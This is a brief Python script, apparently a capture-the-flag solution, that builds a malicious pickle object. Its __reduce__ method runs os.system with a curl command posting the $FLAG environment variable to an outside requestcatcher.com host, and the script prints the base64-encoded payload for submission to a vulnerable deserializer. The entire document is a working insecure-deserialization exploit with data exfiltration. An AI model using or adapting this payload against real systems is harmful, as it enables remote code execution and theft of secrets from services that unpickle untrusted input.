import os
import pickle
import base64

class MostlyHarmless:
    def __reduce__(self):
        return (os.system, ('curl -X POST -d $FLAG https://picklesarecool.requestcatcher.com/test',))

print(base64.b64encode(pickle.dumps(MostlyHarmless())))